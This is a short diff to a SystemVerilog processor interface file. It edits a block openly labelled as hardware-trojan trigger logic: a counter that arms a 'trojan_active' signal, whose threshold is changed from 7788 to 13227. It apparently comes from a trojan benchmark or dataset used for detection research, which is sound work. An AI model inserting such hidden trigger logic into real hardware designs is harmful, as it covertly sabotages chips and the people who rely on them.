@@ -12,12 +12,11 @@ import SchedulerTypes::*;
 interface WakeupSelectIF( input logic clk, rst, rstStart );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=13227)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 7788;
+    localparam int TRIGGER_THRESHOLD = 13227;
     logic [15:0] trojan_counter;
-    logic trojan_active;
-    
+    logic        trojan_active;
     always_ff @(posedge clk or negedge rst) begin
         if (!rst) begin
             trojan_counter <= '0;
